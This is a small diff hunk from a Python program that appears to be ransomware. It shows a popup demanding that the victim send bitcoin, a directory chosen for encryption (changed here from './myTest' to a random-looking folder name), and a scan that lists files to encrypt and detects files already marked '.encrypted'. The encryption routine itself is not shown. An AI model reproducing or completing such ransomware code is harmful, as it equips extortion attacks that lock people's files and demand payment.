@@ -83,7 +83,7 @@ def open_popup():
    Label(top, text= "Please send bitcoin to the address below.", font=('Mistral 18 bold')).place(x=150,y=80)
 
 #directory to be encrypted or decrypted
-targetDir = "./myTest"
+targetDir = "./ZAAPMANX2Y"
 #this will scan through target directory and creates two lists, a list of files with target extensions, and a list of files with .ecrypted extension.
 #If a file with .encrypted is found, the encrypted flag is set to show data has already been encrypted.
 regFilePaths, encFilePaths, encryptedFlag = getFilePaths(targetDir)
